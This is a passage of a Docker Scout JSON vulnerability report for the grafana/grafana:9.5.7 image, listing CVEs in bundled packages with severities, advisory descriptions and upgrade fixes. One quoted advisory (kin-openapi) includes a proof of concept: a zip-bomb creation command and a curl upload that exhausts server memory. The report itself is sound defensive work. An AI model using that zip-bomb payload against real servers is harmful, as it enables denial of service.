          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-6197",
          "value": "CVE-2024-6197",
          "url": "https://scout.docker.com/v/CVE-2024-6197?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.9.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-6197?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.9.0-r0"
        }
      ]
    },
    {
      "id": "66fbf368b952db436307a95fffe2c4adc38333955d78f1ace010ccee82497817",
      "category": "container_scanning",
      "message": "CVE-2025-21614 on github.com/go-git/go-git@5.4.2",
      "description": "### Impact\nA denial of service (DoS) vulnerability was discovered in go-git versions prior to `v5.13`. This vulnerability allows an attacker to perform denial of service attacks by providing specially crafted responses from a Git server which triggers resource exhaustion in `go-git` clients. \n\nThis is a `go-git` implementation issue and does not affect the upstream `git` cli.\n\n### Patches\nUsers running versions of `go-git` from `v4` and above are recommended to upgrade to `v5.13` in order to mitigate this vulnerability.\n\n### Workarounds\nIn cases where a bump to the latest version of `go-git` is not possible, we recommend limiting its use to only trust-worthy Git servers.\n\n## Credit\nThanks to Ionut Lalu for responsibly disclosing this vulnerability to us.",
      "cve": "CVE-2025-21614",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/go-git/go-git@5.4.2 to 5.13.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/go-git/go-git@5.4.2#v5"
          },
          "version": "5.4.2"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-21614",
          "value": "CVE-2025-21614",
          "url": "https://scout.docker.com/v/CVE-2025-21614?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3C5.13.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-21614?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3C5.13.0"
        }
      ]
    },
    {
      "id": "3b6f6e9489f488911aa4ad3599f40ac49ffc407251724ba42f0afe06fe73dd59",
      "category": "container_scanning",
      "message": "CVE-2025-22868 on golang.org/x/oauth2@0.6.0",
      "description": "An attacker can pass a malicious malformed token which causes unexpected memory to be consumed during parsing.",
      "cve": "CVE-2025-22868",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/oauth2@0.6.0 to 0.27.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/oauth2@0.6.0"
          },
          "version": "0.6.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-22868",
          "value": "CVE-2025-22868",
          "url": "https://scout.docker.com/v/CVE-2025-22868?s=github&n=oauth2&ns=golang.org%2Fx&t=golang&vr=%3C0.27.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-22868?s=github&n=oauth2&ns=golang.org%2Fx&t=golang&vr=%3C0.27.0"
        }
      ]
    },
    {
      "id": "5e2b5ddd14f2e3b07237818db66ec2c14c59264dad9f3549effd95e62e32a119",
      "category": "container_scanning",
      "message": "CVE-2025-22869 on golang.org/x/crypto@0.7.0",
      "description": "SSH servers which implement file transfer protocols are vulnerable to a denial of service attack from clients which complete the key exchange slowly, or not at all, causing pending content to be read into memory, but never transmitted.",
      "cve": "CVE-2025-22869",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/crypto@0.7.0 to 0.35.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/crypto@0.7.0"
          },
          "version": "0.7.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-22869",
          "value": "CVE-2025-22869",
          "url": "https://scout.docker.com/v/CVE-2025-22869?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.35.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-22869?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.35.0"
        }
      ]
    },
    {
      "id": "8982f5f24cef9e86362923271c529a4b33212fb14354156c287869b43da9e323",
      "category": "container_scanning",
      "message": "CVE-2025-30153 on github.com/getkin/kin-openapi@0.112.0",
      "description": "### Summary\n\nWhen validating a request with a multipart/form-data schema, if the OpenAPI schema allows it, an attacker can upload a crafted ZIP file (e.g., a ZIP bomb), causing the server to consume all available system memory.\n\n### Details\n\nThe root cause comes from the [ZipFileBodyDecoder](https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1523), which is registered [automatically](https://github.com/getkin/kin-openapi/blob/6da871e0e170b7637eb568c265c08bc2b5d6e7a3/openapi3filter/req_resp_decoder.go#L1275) by the module (contrary to what the [documentation says](https://github.com/getkin/kin-openapi?tab=readme-ov-file#custom-content-type-for-body-of-http-requestresponse).\n\n### PoC\nTo reproduce the vulnerability, you can use the following OpenAPI schema:\n```yaml\nopenapi: 3.0.0\ninfo:\n  title: 'Validator'\n  version: 0.0.1\npaths:\n  /:\n    post:\n      requestBody:\n        required: true\n        content:\n          multipart/form-data:\n            schema:\n              type: object\n              required:\n                - file\n              properties:\n                file:\n                  type: string\n                  format: binary\n      responses:\n        '200':\n          description: Created\n```\nAnd this code to validate the request (nothing fancy, it basically only calls the `openapi3filter.ValidateRequest` function`):\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/getkin/kin-openapi/openapi3filter\"\n\tlegacyrouter \"github.com/getkin/kin-openapi/routers/legacy\"\n\n\t\"github.com/getkin/kin-openapi/openapi3\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tloader := openapi3.NewLoader()\n\n\tdoc, err := loader.LoadFromFile(\"schema.yaml\")\n\tif err != nil {\n\t\thttp.Error(w, \"Failed to load OpenAPI document\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\tif err := doc.Validate(r.Context()); err != nil {\n\t\thttp.Error(w, \"Invalid OpenAPI document\", http.StatusBadRequest)\n\t\treturn\n\t}\n\n\trouter, err := legacyrouter.NewRouter(doc)\n\tif err != nil {\n\t\thttp.Error(w, \"Failed to create router\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\n\troute, pathParams, err := router.FindRoute(r)\n\tif err != nil {\n\t\thttp.Error(w, \"Failed to find route\", http.StatusNotFound)\n\t\treturn\n\t}\n\n\tinput := &openapi3filter.RequestValidationInput{\n\t\tRequest:     r,\n\t\tQueryParams: r.URL.Query(),\n\t\tRoute:       route,\n\t\tPathParams:  pathParams,\n\t}\n\n\tif err := openapi3filter.ValidateRequest(r.Context(), input); err != nil {\n\t\thttp.Error(w, fmt.Sprintf(\"Request validation failed: %v\", err), http.StatusBadRequest)\n\t\treturn\n\t}\n\n\tw.Write([]byte(\"request ok !\"))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\tlog.Fatal(http.ListenAndServe(\":8080\", nil))\n\n}\n```\n\nWe also need to create a zip bomb. This command will create a 4.7GB file and compress it to to 4.7MB zip archive:\n```shell\nperl -e 'print \"0\" x 5000000000' > /tmp/bigfile.txt; zip -9 /tmp/bomb.zip /tmp/bigfile.txt\n```\n\nRun the PoC provided, and upload the zip bomb with `curl localhost:8080/  -F file=\"@/tmp/bomb.zip;type=application/zip\" -v`.\n\nObserve the memory consumption of the test server during and after the upload (it jumped to a bit over 22GB in my testing, with only a 4.7MB input file, you can reduce the size of the generated file to not kill your test machine when reproducing.) \n\n### Impact\n\nAn attacker can trigger an out-of-memory (OOM) condition, leading to server crashes or degraded performance.\nIt seems to only be exploitable if the OpenAPI schema allows for multipart upload.\n\n### Remediation\n\nI see at least 2 potential fixes/improvements:\n - Do not register by default the zip file decoder (I honestly was a bit surprised to see it was enabled by default, it seems to be quite a niche use-case ?)\n - Update `ZipFileBodyDecoder` to enforce a maximum size of the decompressed archive and bailout as soon as it's reached (probably with a small default value and allow the users to configure it through the input options ?)",
      "cve": "CVE-2025-30153",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/getkin/kin-openapi@0.112.0 to 0.131.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/getkin/kin-openapi@0.112.0"
          },
          "version": "0.112.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-30153",
          "value": "CVE-2025-30153",
          "url": "https://scout.docker.com/v/CVE-2025-30153?s=github&n=kin-openapi&ns=github.com%2Fgetkin&t=golang&vr=%3C0.131.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-30153?s=github&n=kin-openapi&ns=github.com%2Fgetkin&t=golang&vr=%3C0.131.0"
        }
      ]
    },
    {
      "id": "16c115702759d6ee212ff58f77c335bf4195161e10082caa20e3a33a0ccaa2c0",
      "category": "container_scanning",
      "message": "GHSA-m425-mq94-257g on google.golang.org/grpc@1.45.0",
      "description": "### Impact\nIn affected releases of gRPC-Go, it is possible for an attacker to send HTTP/2 requests, cancel them, and send subsequent requests, which is valid by the HTTP/2 protocol, but would cause the gRPC-Go server to launch more concurrent method handlers than the configured maximum stream limit.\n\n### Patches\nThis vulnerability was addressed by #6703 and has been included in patch releases: 1.56.3, 1.57.1, 1.58.3.  It is also included in the latest release, 1.59.0.\n\nAlong with applying the patch, users should also ensure they are using the `grpc.MaxConcurrentStreams` server option to apply a limit to the server's resources used for any single connection.\n\n### Workarounds\nNone.\n\n### References\n#6703\n",
      "cve": "GHSA-m425-mq94-257g",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade google.golang.org/grpc@1.45.0 to 1.56.3",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/google.golang.org/grpc@1.45.0"
          },
          "version": "1.45.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "GHSA-m425-mq94-257g",
          "value": "GHSA-m425-mq94-257g",
          "url": "https://scout.docker.com/v/GHSA-m425-mq94-257g?s=github&n=grpc&ns=google.golang.org&t=golang&vr=%3C1.56.3"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/GHSA-m425-mq94-257g?s=github&n=grpc&ns=google.golang.org&t=golang&vr=%3C1.56.3"
        }
      ]
    },
    {
      "id": "800281f18d0eaf24bac2cc049d6af258b06eba4d25af63c09e6ed423df775b2e",
      "category": "container_scanning",
      "message": "CVE-2024-56327 on filippo.io/age@1.1.1",
      "description": "Malicious plugin names, recipients, or identities causing arbitrary binary execution in filippo.io/age",
      "cve": "CVE-2024-56327",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade filippo.io/age@1.1.1 to 1.2.1",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/filippo.io/age@1.1.1"
          },
          "version": "1.1.1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-56327",
          "value": "CVE-2024-56327",
          "url": "https://scout.docker.com/v/CVE-2024-56327?s=golang&n=age&ns=filippo.io&t=golang&vr=%3C1.2.1"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-56327?s=golang&n=age&ns=filippo.io&t=golang&vr=%3C1.2.1"
        }
      ]
    },
    {
      "id": "d2145d2a4dfad7b341f094d59849ff560ad405c07bb845ee9a1a8723b3f1abce",
      "category": "container_scanning",
      "message": "CVE-2025-26519 on alpine/musl@1.2.3-r5",
      "cve": "CVE-2025-26519",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/musl@1.2.3-r5 to 1.2.3-r6",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/musl@1.2.3-r5?os_name=alpine&os_version=3.17"
          },
          "version": "1.2.3-r5"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-26519",
          "value": "CVE-2025-26519",
          "url": "https://scout.docker.com/v/CVE-2025-26519?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.2.3-r6"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-26519?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.2.3-r6"
        }
      ]
    },
    {
      "id": "0ea4f9d20cae9f4a10a2b1437f03e53aa73d03cd736426582fd165f98c3e5080",
      "category": "container_scanning",
      "message": "CVE-2024-2398 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-2398",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.7.1-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-2398",
          "value": "CVE-2024-2398",
          "url": "https://scout.docker.com/v/CVE-2024-2398?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.7.1-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-2398?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.7.1-r0"
        }
      ]
    },
    {
      "id": "77b4b9ea5213b766c96c4e72abe4ff1413a3d2f29621f94835f6932539f0522d",
      "category": "container_scanning",
      "message": "CVE-2025-30204 on github.com/golang-jwt/jwt@4.4.3",
      "description": "### Summary\n\nFunction [`parse.ParseUnverified`](https://github.com/golang-jwt/jwt/blob/c035977d9e11c351f4c05dfeae193923cbab49ee/parser.go#L138-L139) currently splits (via a call to [strings.Split](https://pkg.go.dev/strings#Split)) its argument (which is untrusted data) on periods.\n\nAs a result, in the face of a malicious request whose _Authorization_ header consists of `Bearer ` followed by many period characters, a call to that function incurs allocations to the tune of O(n) bytes (where n stands for the length of the function's argument), with a constant factor of about 16. Relevant weakness: [CWE-405: Asymmetric Resource Consumption (Amplification)](https://cwe.mitre.org/data/definitions/405.html)\n\n### Details\n\nSee [`parse.ParseUnverified`](https://github.com/golang-jwt/jwt/blob/c035977d9e11c351f4c05dfeae193923cbab49ee/parser.go#L138-L139) \n\n### Impact\n\nExcessive memory allocation",
      "cve": "CVE-2025-30204",
      "severity": "High",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/golang-jwt/jwt@4.4.3 to 4.5.2",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/golang-jwt/jwt@4.4.3#v4"
          },
          "version": "4.4.3"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-30204",
          "value": "CVE-2025-30204",
          "url": "https://scout.docker.com/v/CVE-2025-30204?s=github&n=v4&ns=github.com%2Fgolang-jwt%2Fjwt&t=golang&vr=%3C4.5.2"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-30204?s=github&n=v4&ns=github.com%2Fgolang-jwt%2Fjwt&t=golang&vr=%3C4.5.2"
        }
      ]
    },
    {
      "id": "dd146f634ee54a219c24dd2f60ad1eb91545758461672ca61a1664012586fda2",
      "category": "container_scanning",
      "message": "CVE-2024-45337 on golang.org/x/crypto@0.7.0",
      "description": "Applications and libraries which misuse the ServerConfig.PublicKeyCallback callback may be susceptible to an authorization bypass.\n\nThe documentation for ServerConfig.PublicKeyCallback says that \"A call to this function does not guarantee that the key offered is in fact used to authenticate.\" Specifically, the SSH protocol allows clients to inquire about whether a public key is acceptable before proving control of the corresponding private key. PublicKeyCallback may be called with multiple keys, and the order in which the keys were provided cannot be used to infer which key the client successfully authenticated with, if any. Some applications, which store the key(s) passed to PublicKeyCallback (or derived information) and make security relevant determinations based on it once the connection is established, may make incorrect assumptions.\n\nFor example, an attacker may send public keys A and B, and then authenticate with A. PublicKeyCallback would be called only twice, first with A and then with B. A vulnerable application may then make authorization decisions based on key B for which the attacker does not actually control the private key.\n\nSince this API is widely misused, as a partial mitigation golang.org/x/crypto@v0.31.0 enforces the property that, when successfully authenticating via public key, the last key passed to ServerConfig.PublicKeyCallback will be the key used to authenticate the connection. PublicKeyCallback will now be called multiple times with the same key, if necessary. Note that the client may still not control the last key passed to PublicKeyCallback if the connection is then authenticated with a different method, such as PasswordCallback, KeyboardInteractiveCallback, or NoClientAuth.\n\nUsers should be using the Extensions field of the Permissions return value from the various authentication callbacks to record data associated with the authentication attempt instead of referencing external state. Once the connection is established the state corresponding to the successful authentication attempt can be retrieved via the ServerConn.Permissions field. Note that some third-party libraries misuse the Permissions type by sharing it across authentication attempts; users of third-party libraries should refer to the relevant projects for guidance.",
      "cve": "CVE-2024-45337",
      "severity": "Critical",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/crypto@0.7.0 to 0.31.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/crypto@0.7.0"
          },
          "version": "0.7.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-45337",
          "value": "CVE-2024-45337",
          "url": "https://scout.docker.com/v/CVE-2024-45337?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.31.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-45337?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.31.0"
        }
      ]
    },
    {
      "id": "8349d389a9f62593b62b6a2652e3dc4f3fd3addb008068a8e174cba7f09b377b",
      "category": "container_scanning",
      "message": "CVE-2024-5535 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2024-5535",
      "severity": "Critical",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.14-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-5535",
          "value": "CVE-2024-5535",
          "url": "https://scout.docker.com/v/CVE-2024-5535?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.14-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-5535?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.14-r0"
        }
      ]
    },
    {
      "id": "0d63c6bd8cb77c810ceb6a7ecc53bc8c2c9fed3d71263e74583e3f58d163092d",
      "category": "container_scanning",
      "message": "CVE-2024-8986 on github.com/grafana/grafana-plugin-sdk-go@0.157.0",
      "description": "The grafana plugin SDK bundles build metadata into the binaries it compiles; this metadata includes the repository URI for the plugin being built, as retrieved by running `git remote get-url origin`.\n \nIf credentials are included in the repository URI (for instance, to allow for fetching of private dependencies), the final binary will contain the full URI, including said credentials.",
      "cve": "CVE-2024-8986",
      "severity": "Critical",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/grafana/grafana-plugin-sdk-go@0.157.0 to 0.250.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/grafana/grafana-plugin-sdk-go@0.157.0"
          },
          "version": "0.157.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-8986",
          "value": "CVE-2024-8986",
          "url": "https://scout.docker.com/v/CVE-2024-8986?s=github&n=grafana-plugin-sdk-go&ns=github.com%2Fgrafana&t=golang&vr=%3C%3D0.249.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-8986?s=github&n=grafana-plugin-sdk-go&ns=github.com%2Fgrafana&t=golang&vr=%3C%3D0.249.0"
        }
      ]
    },
    {
      "id": "a362c54b4540d289bd31e74de06c3979711d5cb2fd2194fd60a7f43593b47216",
      "category": "container_scanning",
      "message": "CVE-2025-22871 on stdlib@1.20.6",
      "description": "The net/http package improperly accepts a bare LF as a line terminator in chunked data chunk-size lines. This can permit request smuggling if a net/http server is used in conjunction with a server that incorrectly accepts a bare LF as part of a chunk-ext.",
      "cve": "CVE-2025-22871",
      "severity": "Critical",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.23.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-22871",
          "value": "CVE-2025-22871",
          "url": "https://scout.docker.com/v/CVE-2025-22871?s=golang&n=stdlib&t=golang&vr=%3C1.23.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-22871?s=golang&n=stdlib&t=golang&vr=%3C1.23.8"
        }
      ]
    },
    {
      "id": "a638a909e4d3cca8d0d6e07883c5294ce3cbd37f80a3dcfb553a89cde9f4120b",
      "category": "container_scanning",
      "message": "CVE-2025-21613 on github.com/go-git/go-git@5.4.2",
      "description": "### Impact\nAn argument injection vulnerability was discovered in `go-git` versions prior to `v5.13`. \n\nSuccessful exploitation of this vulnerability could allow an attacker to set arbitrary values to [git-upload-pack flags](https://git-scm.com/docs/git-upload-pack). This only happens when the `file` transport protocol is being used, as that is the only protocol that shells out to `git` binaries.\n\n### Affected versions\nUsers running versions of `go-git` from `v4` and above are recommended to upgrade to `v5.13` in order to mitigate this vulnerability.\n\n### Workarounds\nIn cases where a bump to the latest version of `go-git` is not possible, we recommend users to enforce restrict validation rules for values passed in the URL field.\n\n## Credit\nThanks to @vin01 for responsibly disclosing this vulnerability to us.",
      "cve": "CVE-2025-21613",
      "severity": "Critical",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/go-git/go-git@5.4.2 to 5.13.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/go-git/go-git@5.4.2#v5"
          },
          "version": "5.4.2"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-21613",
          "value": "CVE-2025-21613",
          "url": "https://scout.docker.com/v/CVE-2025-21613?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3C5.13.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-21613?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3C5.13.0"
        }
      ]
    },
    {
      "id": "9a208d4da685618d9fa02e7bb6a6f654412e90fdc085435d49574d2c9191cbff",
      "category": "container_scanning",
      "message": "CVE-2023-38545 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2023-38545",
      "severity": "Critical",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.4.0-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-38545",
          "value": "CVE-2023-38545",
          "url": "https://scout.docker.com/v/CVE-2023-38545?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.4.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-38545?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.4.0-r0"
        }
      ]
    },
    {
      "id": "8d7d9fd6cfc81d491c02e491c78fd8f2ccaa9e4196aaefde15a4b1cebab191a4",
      "category": "container_scanning",
      "message": "CVE-2023-49569 on github.com/go-git/go-git@5.4.2",
      "description": "### Impact\nA path traversal vulnerability was discovered in go-git versions prior to `v5.11`. This vulnerability allows an attacker to create and amend files across the filesystem. In the worse case scenario, remote code execution could be achieved.\n\nApplications are only affected if they are using the [ChrootOS](https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#ChrootOS), which is the default when using \"Plain\" versions of Open and Clone funcs (e.g. PlainClone). Applications using [BoundOS](https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#BoundOS) or in-memory filesystems are not affected by this issue.\nThis is a `go-git` implementation issue and does not affect the upstream `git` cli.\n\n### Patches\nUsers running versions of `go-git` from `v4` and above are recommended to upgrade to `v5.11` in order to mitigate this vulnerability.\n\n### Workarounds\nIn cases where a bump to the latest version of `go-git` is not possible in a timely manner, we recommend limiting its use to only trust-worthy Git servers.\n\n## Credit\nThanks to Ionut Lalu for responsibly disclosing this vulnerability to us.",
      "cve": "CVE-2023-49569",
      "severity": "Critical",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/go-git/go-git@5.4.2 to 5.11.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/go-git/go-git@5.4.2#v5"
          },
          "version": "5.4.2"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-49569",
          "value": "CVE-2023-49569",
          "url": "https://scout.docker.com/v/CVE-2023-49569?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3E%3D5.0.0%2C%3C5.11.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-49569?s=github&n=v5&ns=github.com%2Fgo-git%2Fgo-git&t=golang&vr=%3E%3D5.0.0%2C%3C5.11.0"
        }
      ]
    },
    {
      "id": "28911de3f006581a74ba2de8b848a4933fb0f74914d6ab05d26a337fa54d569e",
      "category": "container_scanning",
      "message": "CVE-2024-24790 on stdlib@1.20.6",
      "description": "The various Is methods (IsPrivate, IsLoopback, etc) did not work as expected for IPv4-mapped IPv6 addresses, returning false for addresses which would return true in their traditional IPv4 forms.",
      "cve": "CVE-2024-24790",
      "severity": "Critical",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.11",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-24790",
          "value": "CVE-2024-24790",
          "url": "https://scout.docker.com/v/CVE-2024-24790?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-24790?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"
        }
      ]
    }
  ],
  "remediations": [],
  "scan": {
    "start_time": "2025-10-30T03:37:44",
    "end_time": "2025-10-30T03:37:44",
    "status": "success",
    "type": "container_scanning",
    "scanner": {
      "id": "docker-scout",
      "name": "Docker Scout",
      "version": "1.18.3",
      "vendor": {
        "name": "Docker"
      }
    },
    "analyzer": {
      "id": "docker-scout",
      "name": "Docker Scout",
      "version": "1.18.3",
      "vendor": {
        "name": "Docker"
      }
    }
  }
}
